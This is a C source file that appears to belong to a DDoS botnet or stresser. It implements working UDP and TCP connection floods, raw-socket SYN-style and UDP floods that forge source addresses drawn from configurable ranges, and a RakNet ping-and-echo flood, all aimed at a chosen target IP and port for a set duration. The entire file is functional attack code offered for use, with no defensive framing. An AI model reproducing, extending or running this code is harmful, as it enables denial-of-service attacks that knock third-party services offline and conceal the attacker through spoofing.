#define _GNU_SOURCE

#include "headers/attacks.h"
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/tcp.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define UDP_WORKERS_MAX 16
#define UDP_BATCH 32

typedef struct {
    flood_args *a;
    unsigned char *pkt;
    int plen;
    struct sockaddr_in d;
    time_t end;
} udp_warg;

static void *udp_worker(void *v) {
    udp_warg *w = v;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return NULL;
    int sndbuf = 4 * 1024 * 1024;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    int fl = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, fl | O_NONBLOCK);
    /* connected: skips route lookup per packet */
    if (connect(s, (struct sockaddr *)&w->d, sizeof(w->d)) < 0) {
        close(s);
        return NULL;
    }
    unsigned long n = 0;
    while (*w->a->active) {
        for (int i = 0; i < UDP_BATCH; i++) {
            send(s, w->pkt, (size_t)w->plen, MSG_DONTWAIT);
        }
        if ((++n & 1023) == 0 && time(NULL) >= w->end) break;
    }
    close(s);
    return NULL;
}

void *udp_flood(void *arg) {
    flood_args *a = arg;
    unsigned char *pkt = malloc(65500);
    if (!pkt) return NULL;
    int plen = build_payload(a, pkt, 65500);

    struct sockaddr_in d;
    memset(&d, 0, sizeof(d));
    d.sin_family = AF_INET;
    d.sin_port = htons((uint16_t)a->port);
    inet_pton(AF_INET, a->ip, &d.sin_addr);

    long cores = sysconf(_SC_NPROCESSORS_ONLN);
    int nw = (cores > 0) ? (int)cores : 8;
    if (nw < 2) nw = 2;
    if (nw > UDP_WORKERS_MAX) nw = UDP_WORKERS_MAX;

    udp_warg w;
    w.a = a;
    w.pkt = pkt;
    w.plen = plen;
    w.d = d;
    w.end = time(NULL) + a->duration;

    pthread_t tids[UDP_WORKERS_MAX];
    int created = 0;
    for (int i = 0; i < nw; i++) {
        if (pthread_create(&tids[i], NULL, udp_worker, &w) == 0) created++;
    }
    for (int i = 0; i < created; i++) pthread_join(tids[i], NULL);
    free(pkt);
    return NULL;
}

#define TCP_WORKERS_MAX 16
#define TCP_CONNS 16

typedef struct {
    flood_args *a;
    unsigned char *pkt;
    int plen;
    struct sockaddr_in d;
    time_t end;
} tcp_warg;

static int tcp_conn(struct sockaddr_in *d) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return -1;
    int one = 1;
    setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    int fl = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, fl | O_NONBLOCK);
    int r = connect(s, (struct sockaddr *)d, sizeof(*d));
    if (r < 0 && errno != EINPROGRESS) { close(s); return -1; }
    if (r < 0) {
        struct pollfd p = {s, POLLOUT, 0};
        if (poll(&p, 1, 2000) <= 0) { close(s); return -1; }
        int e = 0;
        socklen_t el = sizeof(e);
        getsockopt(s, SOL_SOCKET, SO_ERROR, &e, &el);
        if (e != 0) { close(s); return -1; }
    }
    return s;
}

static void *tcp_worker(void *v) {
    tcp_warg *w = v;
    int socks[TCP_CONNS];
    for (int i = 0; i < TCP_CONNS; i++) socks[i] = -1;
    unsigned long n = 0;
    while (*w->a->active) {
        for (int i = 0; i < TCP_CONNS; i++) {
            if (socks[i] < 0) {
                socks[i] = tcp_conn(&w->d);
                if (socks[i] < 0) continue;
            }
            ssize_t r = send(socks[i], w->pkt, (size_t)w->plen,
                             MSG_NOSIGNAL | MSG_DONTWAIT);
            if (r < 0 && errno != EAGAIN && errno != EWOULDBLOCK && errno != EINTR) {
                close(socks[i]);
                socks[i] = -1;
            }
        }
        if ((++n & 1023) == 0 && time(NULL) >= w->end) break;
    }
    for (int i = 0; i < TCP_CONNS; i++) {
        if (socks[i] >= 0) close(socks[i]);
    }
    return NULL;
}

void *tcp_flood(void *arg) {
    flood_args *a = arg;
    unsigned char *pkt = malloc(65500);
    if (!pkt) return NULL;
    int plen = build_payload(a, pkt, 65500);

    struct sockaddr_in d;
    memset(&d, 0, sizeof(d));
    d.sin_family = AF_INET;
    d.sin_port = htons((uint16_t)a->port);
    inet_pton(AF_INET, a->ip, &d.sin_addr);

    long cores = sysconf(_SC_NPROCESSORS_ONLN);
    int nw = (cores > 0) ? (int)cores : 8;
    if (nw < 2) nw = 2;
    if (nw > TCP_WORKERS_MAX) nw = TCP_WORKERS_MAX;

    tcp_warg w;
    w.a = a;
    w.pkt = pkt;
    w.plen = plen;
    w.d = d;
    w.end = time(NULL) + a->duration;

    pthread_t tids[TCP_WORKERS_MAX];
    int created = 0;
    for (int i = 0; i < nw; i++) {
        if (pthread_create(&tids[i], NULL, tcp_worker, &w) == 0) created++;
    }
    for (int i = 0; i < created; i++) pthread_join(tids[i], NULL);
    free(pkt);
    return NULL;
}

/* ================= spoof helpers (raw methods) ================= */
#define SPOOF_MAX 32
typedef struct { uint32_t net; uint32_t mask; } spoof_ent;

static int parse_spoof(const char *s, spoof_ent *out, int max) {
    int n = 0;
    const char *p = s;
    while (*p && n < max) {
        while (*p == '!' || *p == ',' || *p == ' ') p++;
        if (!*p) break;
        const char *e = p;
        while (*e && *e != '!' && *e != ',' && *e != ' ') e++;
        char tok[64];
        int tl = (int)(e - p);
        if (tl <= 0 || tl >= 64) { p = e; continue; }
        memcpy(tok, p, (size_t)tl);
        tok[tl] = '\0';
        p = e;
        char *sl = strchr(tok, '/');
        int pfx = 32;
        if (sl) {
            *sl = '\0';
            pfx = atoi(sl + 1);
            if (pfx < 0 || pfx > 32) continue;
        }
        struct in_addr ia;
        if (inet_pton(AF_INET, tok, &ia) != 1) continue;
        uint32_t ip = ntohl(ia.s_addr);
        uint32_t mask = (pfx == 0) ? 0 : (0xffffffffu << (32 - pfx));
        out[n].net = ip & mask;
        out[n].mask = mask;
        n++;
    }
    return n;
}

static uint32_t spoof_pick(spoof_ent *ents, int n) {
    spoof_ent *e = &ents[rand() % n];
    uint32_t host = ((uint32_t)rand() << 16) ^ (uint32_t)rand();
    uint32_t ip = e->net | (host & ~e->mask);
    if ((ip & ~e->mask) == 0) ip |= 1;
    return htonl(ip);
}

struct iphdr_raw {
    uint8_t ihl_ver;
    uint8_t tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag;
    uint8_t ttl;
    uint8_t proto;
    uint16_t csum;
    uint32_t saddr;
    uint32_t daddr;
};

struct tcphdr_raw {
    uint16_t source;
    uint16_t dest;
    uint32_t seq;
    uint32_t ack;
    uint8_t doff_res;
    uint8_t flags;
    uint16_t window;
    uint16_t csum;
    uint16_t urg;
};

struct udphdr_raw {
    uint16_t source;
    uint16_t dest;
    uint16_t len;
    uint16_t csum;
};

static uint16_t udp_csum(uint32_t saddr, uint32_t daddr, const uint8_t *udp, int ulen) {
    uint32_t s = 0;
    s += (saddr >> 16) & 0xffff;
    s += saddr & 0xffff;
    s += (daddr >> 16) & 0xffff;
    s += daddr & 0xffff;
    s += 17;
    s += (uint32_t)ulen;
    const uint16_t *p = (const uint16_t *)udp;
    int l = ulen;
    while (l > 1) { s += *p++; l -= 2; }
    if (l) s += *(const uint8_t *)p;
    s = (s >> 16) + (s & 0xffff);
    s += (s >> 16);
    return (uint16_t)~s;
}

/* TCPRAW: raw SYN-style flood, spoofed source, custom flags */
void *tcpraw_flood(void *arg) {
    flood_args *a = arg;
    time_t end = time(NULL) + a->duration;
    spoof_ent ents[SPOOF_MAX];
    int nn = 0;
    if (a->spoof[0]) nn = parse_spoof(a->spoof, ents, SPOOF_MAX);
    int flags = (a->tcpflags >= 0 && a->tcpflags <= 0xff) ? a->tcpflags : 0x02;
    unsigned char pkt[1600];
    unsigned char payload[1500];
    int paylen = build_payload(a, payload, (int)sizeof(payload));
    if (paylen > 1400) paylen = 1400;

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) return NULL;
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    struct sockaddr_in d;
    memset(&d, 0, sizeof(d));
    d.sin_family = AF_INET;
    inet_pton(AF_INET, a->ip, &d.sin_addr);
    int fl = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, fl | O_NONBLOCK);
    struct in_addr dip;
    dip.s_addr = d.sin_addr.s_addr;

    while (*a->active && time(NULL) < end) {
        struct iphdr_raw *iph = (struct iphdr_raw *)pkt;
        struct tcphdr_raw *tcph = (struct tcphdr_raw *)(pkt + 20);
        int tlen = 20 + paylen;
        iph->ihl_ver = 0x45;
        iph->tos = 0;
        iph->tot_len = htons((uint16_t)(20 + tlen));
        iph->id = htons((uint16_t)(rand() & 0xffff));
        iph->frag = 0;
        iph->ttl = 64;
        iph->proto = 6;
        iph->csum = 0;
        iph->saddr = nn > 0 ? spoof_pick(ents, nn) : 0;
        iph->daddr = dip.s_addr;
        iph->csum = csum(pkt, 20);
        tcph->source = htons((uint16_t)(a->srcport > 0 ? a->srcport : (1024 + (rand() % 64511))));
        tcph->dest = htons((uint16_t)a->port);
        tcph->seq = htonl((uint32_t)rand());
        tcph->ack = 0;
        tcph->doff_res = 0x50;
        tcph->flags = (uint8_t)flags;
        tcph->window = htons(65535);
        tcph->csum = 0;
        tcph->urg = 0;
        memcpy(pkt + 40, payload, (size_t)paylen);
        tcph->csum = udp_csum(iph->saddr, iph->daddr, (uint8_t *)tcph, tlen);
        sendto(s, pkt, (size_t)(20 + tlen), MSG_DONTWAIT, (struct sockaddr *)&d, sizeof(d));
    }
    close(s);
    return NULL;
}

/* UDPRAW: raw UDP flood, spoofed source */
void *udpraw_flood(void *arg) {
    flood_args *a = arg;
    time_t end = time(NULL) + a->duration;
    spoof_ent ents[SPOOF_MAX];
    int nn = 0;
    if (a->spoof[0]) nn = parse_spoof(a->spoof, ents, SPOOF_MAX);
    unsigned char pkt[1600];
    unsigned char payload[1500];
    int paylen = build_payload(a, payload, (int)sizeof(payload));
    if (paylen > 1400) paylen = 1400;

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (s < 0) return NULL;
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    struct sockaddr_in d;
    memset(&d, 0, sizeof(d));
    d.sin_family = AF_INET;
    inet_pton(AF_INET, a->ip, &d.sin_addr);
    int fl = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, fl | O_NONBLOCK);
    struct in_addr dip;
    dip.s_addr = d.sin_addr.s_addr;

    while (*a->active && time(NULL) < end) {
        struct iphdr_raw *iph = (struct iphdr_raw *)pkt;
        struct udphdr_raw *udph = (struct udphdr_raw *)(pkt + 20);
        int ulen = 8 + paylen;
        iph->ihl_ver = 0x45;
        iph->tos = 0;
        iph->tot_len = htons((uint16_t)(20 + ulen));
        iph->id = htons((uint16_t)(rand() & 0xffff));
        iph->frag = 0;
        iph->ttl = 64;
        iph->proto = 17;
        iph->csum = 0;
        iph->saddr = nn > 0 ? spoof_pick(ents, nn) : 0;
        iph->daddr = dip.s_addr;
        iph->csum = csum(pkt, 20);
        udph->source = htons((uint16_t)(a->srcport > 0 ? a->srcport : (1024 + (rand() % 64511))));
        udph->dest = htons((uint16_t)a->port);
        udph->len = htons((uint16_t)ulen);
        udph->csum = 0;
        memcpy(pkt + 28, payload, (size_t)paylen);
        udph->csum = udp_csum(iph->saddr, iph->daddr, (uint8_t *)udph, ulen);
        sendto(s, pkt, (size_t)(20 + ulen), MSG_DONTWAIT, (struct sockaddr *)&d, sizeof(d));
    }
    close(s);
    return NULL;
}

/* RAKNET: offline ping magic + 16 random bytes, echo server reply back */
void *raknet_flood(void *arg) {
    flood_args *a = arg;
    time_t end = time(NULL) + a->duration;
    static const uint8_t magic[25] = {
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe, 0xfd, 0xfd, 0xfd,
        0xfd, 0x12, 0x34, 0x56, 0x78
    };
    struct sockaddr_in d;
    memset(&d, 0, sizeof(d));
    d.sin_family = AF_INET;
    d.sin_port = htons((uint16_t)a->port);
    inet_pton(AF_INET, a->ip, &d.sin_addr);

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return NULL;
    if (connect(s, (struct sockaddr *)&d, sizeof(d)) < 0) {
        close(s);
        return NULL;
    }
    int fl = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, fl | O_NONBLOCK);
    uint8_t out[64], in[2048];
    while (*a->active && time(NULL) < end) {
        memcpy(out, magic, sizeof(magic));
        for (int i = 0; i < 16; i++) out[sizeof(magic) + i] = (uint8_t)(rand() & 0xff);
        send(s, out, sizeof(magic) + 16, MSG_DONTWAIT);
        struct pollfd p = {s, POLLIN, 0};
        if (poll(&p, 1, 500) > 0) {
            ssize_t n = recv(s, in, sizeof(in), MSG_DONTWAIT);
            if (n > 0) send(s, in, (size_t)n, MSG_DONTWAIT);
        }
    }
    close(s);
    return NULL;
}
